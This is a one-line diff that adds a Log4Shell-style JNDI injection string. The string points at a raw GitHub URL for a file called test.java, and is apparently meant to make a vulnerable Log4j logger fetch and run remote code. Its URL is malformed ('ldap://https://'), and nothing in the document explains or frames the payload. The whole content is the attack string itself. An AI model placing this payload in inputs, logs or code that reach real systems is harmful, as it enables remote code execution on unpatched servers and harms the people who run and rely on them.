@@ -1,0 +1,1 @@
+${jndi:ldap://https://raw.githubusercontent.com/wwwqr-000/1/main/test.java}
